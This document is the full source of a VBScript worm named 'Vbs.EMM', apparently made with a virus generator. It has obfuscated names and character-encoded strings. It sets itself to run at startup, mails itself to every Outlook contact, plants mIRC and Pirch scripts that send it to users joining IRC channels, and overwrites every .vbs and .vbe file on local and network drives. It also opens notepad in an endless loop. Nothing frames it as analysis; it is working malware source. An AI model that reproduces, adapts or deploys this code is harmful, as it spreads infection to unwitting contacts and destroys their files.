'Vbs.EMM Created By PetiK
On Error Resume Next
Set TNQt988o400 = CreateObject("WScript.Shell")
TNQt988o400.regwrite "HKCU\software\EMM\", Chr(87) & Chr(111) & Chr(114) & Chr(109) & Chr(32) & Chr(109) & Chr(97) & Chr(100) & Chr(101) & Chr(32) & Chr(119) & Chr(105) & Chr(116) & Chr(104) & Chr(32) & Chr(86) & Chr(98) & Chr(115) & Chr(119) & Chr(103) & Chr(32) & Chr(49) & Chr(46) & Chr(53) & Chr(48) & Chr(98)
Set JvgsTit5a72= Createobject("scripting.filesystemobject")
JvgsTit5a72.copyfile wscript.scriptfullname,JvgsTit5a72.GetSpecialFolder(1)& "\EMM.vbs"
TNQt988o400.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\EMM","wscript.exe "&JvgsTit5a72.GetSpecialFolder(1)& "\EMM.vbs %"
if TNQt988o400.regread ("HKCU\software\EMM\mailed") <> "1" then
kIHPFh861k3()
end if
if TNQt988o400.regread ("HKCU\software\EMM\mirqued") <> "1" then
zDd70iLFADP ""
end if
if TNQt988o400.regread ("HKCU\software\EMM\pirched") <> "1" then
k1ZkxF463R3 ""
end if
QXSU1LFI3YS()
Do
TNQt988o400.run "notepad",false
loop
Function kIHPFh861k3()
On Error Resume Next
Set q2y537AoqX7 = CreateObject("Outlook.Application")
If q2y537AoqX7= "Outlook"Then
Set VN7qywv4TV3=q2y537AoqX7.GetNameSpace("MAPI")
Set lPo3cDjqxQJ= VN7qywv4TV3.AddressLists
For Each hoNe2bSr49j In lPo3cDjqxQJ
If hoNe2bSr49j.AddressEntries.Count <> 0 Then
R625XliP336 = hoNe2bSr49j.AddressEntries.Count
For l9hAgiY41KT= 1 To R625XliP336
Set mgsTit5a727 = q2y537AoqX7.CreateItem(0)
Set KQt988o400V = hoNe2bSr49j.AddressEntries(l9hAgiY41KT)
mgsTit5a727.To = KQt988o400V.Address
mgsTit5a727.Subject = "Here you have, ;o)"
mgsTit5a727.Body = "Hi:" & vbcrlf & "Check This!" & vbcrlf & ""
set OHPFh861k34=mgsTit5a727.Attachments
OHPFh861k34.Add JvgsTit5a72.GetSpecialFolder(1)& "\EMM.vbs"
mgsTit5a727.DeleteAfterSubmit = True
If mgsTit5a727.To <> "" Then
mgsTit5a727.Send
TNQt988o400.regwrite "HKCU\software\EMM\mailed", "1"
End If
Next
End If
Next
end if
End Function
Function zDd70iLFADP(Wd70iLFADP4)
On Error Resume Next
if Wd70iLFADP4 = "" then
if JvgsTit5a72.fileexists("c:\mirc\mirc.ini") then Wd70iLFADP4="c:\mirc"
if JvgsTit5a72.fileexists("c:\mirc32\mirc.ini") then Wd70iLFADP4="c:\mirc32"
EZkxF463R37=TNQt988o400.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if JvgsTit5a72.fileexists(EZkxF463R37 & "\mirc\mirc.ini") then Wd70iLFADP4=EZkxF463R37 & "\mirc"
end if
if Wd70iLFADP4 <> "" then
set GSU1LFI3YSV = JvgsTit5a72.CreateTextFile(Wd70iLFADP4 & "\script.ini", True)
Gy537AoqX7V="[script]"
Gy537AoqX7V=Gy537AoqX7V&vbcrlf&"n0=on 1:JOIN:#:{"
Gy537AoqX7V=Gy537AoqX7V&vbcrlf&"n1=  /if ( $nick == $me ) { halt }"
Gy537AoqX7V=Gy537AoqX7V&vbcrlf&"n2=  /." & chr(100) & chr(99) & chr(99) & " send $nick "&JvgsTit5a72.GetSpecialFolder(1)& "\EMM.vbs" & vbCrLf & "n3=}"
GSU1LFI3YSV.writeline Gy537AoqX7V
GSU1LFI3YSV.close
TNQt988o400.regwrite "HKCU\software\EMM\Mirqued", "1"
end if
end function
function k1ZkxF463R3(D7qywv4TV3K)
On Error Resume Next
if D7qywv4TV3K="" then
if JvgsTit5a72.fileexists("c:\pirch\Pirch32.exe") then D7qywv4TV3K="c:\pirch"
if JvgsTit5a72.fileexists("c:\pirch32\Pirch32.exe") then D7qywv4TV3K="c:\pirch32"
pNe2bSr49j1=TNQt988o400.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if JvgsTit5a72.fileexists(pNe2bSr49j1 & "\pirch\Pirch32.exe") then D7qywv4TV3K=pNe2bSr49j1 & "\pirch\Pirch32.exe"
end if
if D7qywv4TV3K <> "" then
set Do3cDjqxQJl= JvgsTit5a72.CreateTextFile(D7qywv4TV3K & "\events.ini", True)
Do3cDjqxQJl.WriteLine "[Levels]"
Do3cDjqxQJl.WriteLine "Enabled=1"
Do3cDjqxQJl.WriteLine "Count=6"
Do3cDjqxQJl.WriteLine "Level1=000-Unknowns"
Do3cDjqxQJl.WriteLine "000-UnknownsEnabled=1"
Do3cDjqxQJl.WriteLine "Level2=100-Level 100"
Do3cDjqxQJl.WriteLine "100-Level 100Enabled=1"
Do3cDjqxQJl.WriteLine "Level3=200-Level 200"
Do3cDjqxQJl.WriteLine "200-Level 200Enabled=1"
Do3cDjqxQJl.WriteLine "Level4=300-Level 300"
Do3cDjqxQJl.WriteLine " 300-Level 300Enabled=1"
Do3cDjqxQJl.WriteLine "Level5=400-Level 400 "
Do3cDjqxQJl.WriteLine "400-Level 400Enabled=1"
Do3cDjqxQJl.WriteLine "Level6=500-Level 500"
Do3cDjqxQJl.WriteLine "500-Level 500Enabled=1"
Do3cDjqxQJl.WriteLine ""
Do3cDjqxQJl.WriteLine "[000-Unknowns]"
Do3cDjqxQJl.WriteLine "UserCount=0"
Do3cDjqxQJl.WriteLine "EventCount=0"
Do3cDjqxQJl.WriteLine ""
Do3cDjqxQJl.WriteLine "[100-Level 100]"
Do3cDjqxQJl.WriteLine "User1=*!*@*"
Do3cDjqxQJl.WriteLine "UserCount=1"
Do3cDjqxQJl.writeline "Event1=ON JOIN:#:/" & chr(100) & chr(99) & chr(99) & " tsend $nick " & JvgsTit5a72.GetSpecialFolder(1) & "\EMM.vbs"
Do3cDjqxQJl.WriteLine "EventCount=1"
Do3cDjqxQJl.WriteLine ""
Do3cDjqxQJl.WriteLine "[200-Level 200]"
Do3cDjqxQJl.WriteLine "UserCount=0"
Do3cDjqxQJl.WriteLine "EventCount=0"
Do3cDjqxQJl.WriteLine ""
Do3cDjqxQJl.WriteLine "[300-Level 300]"
Do3cDjqxQJl.WriteLine "UserCount=0"
Do3cDjqxQJl.WriteLine "EventCount=0"
Do3cDjqxQJl.WriteLine ""
Do3cDjqxQJl.WriteLine "[400-Level 400]"
Do3cDjqxQJl.WriteLine "UserCount=0"
Do3cDjqxQJl.WriteLine "EventCount=0"
Do3cDjqxQJl.WriteLine ""
Do3cDjqxQJl.WriteLine "[500-Level 500]"
Do3cDjqxQJl.WriteLine "UserCount=0"
Do3cDjqxQJl.WriteLine "EventCount=0"
Do3cDjqxQJl.close
TNQt988o400.regwrite "HKCU\software\EMM\pirched", "1"
end if
end function
Function QXSU1LFI3YS()
On Error Resume Next
Set ZhAgiY41KTt = JvgsTit5a72.Drives
For Each R25XliP336m In ZhAgiY41KTt
If R25XliP336m.Drivetype = Remote Then
usTit5a727n= R25XliP336m & "\"
Call Jt988o400V6(usTit5a727n)
ElseIf R25XliP336m.IsReady Then
usTit5a727n= R25XliP336m&"\"
Call Jt988o400V6(usTit5a727n)
End If
Next
End Function
Function Jt988o400V6(IPFh861k34d)
zkxF463R375=IPFh861k34d
Set o70iLFADP47= JvgsTit5a72.GetFolder(zkxF463R375)
Set sU1LFI3YSV7= o70iLFADP47.Files
For Each e537AoqX7VD In sU1LFI3YSV7
if JvgsTit5a72.GetExtensionName(e537AoqX7VD.path) = "vbs" then
JvgsTit5a72.copyfile wscript.scriptfullname , e537AoqX7VD.path , true
end if
if JvgsTit5a72.GetExtensionName(e537AoqX7VD.path) = "vbe" then
JvgsTit5a72.copyfile wscript.scriptfullname , e537AoqX7VD.path , true
end if
if e537AoqX7VD.name = "mirc.ini" then
zDd70iLFADP(e537AoqX7VD.ParentFolder)
end if
if e537AoqX7VD.name = "Pirch32.exe" then
k1ZkxF463R3(e537AoqX7VD.ParentFolder)
end if
Next
Set e537AoqX7VD= o70iLFADP47.SubFolders
For Each Tqywv4TV3Kp In e537AoqX7VD
Call Jt988o400V6(Tqywv4TV3Kp.path)
Next
End Function
'Vbswg 1.50b
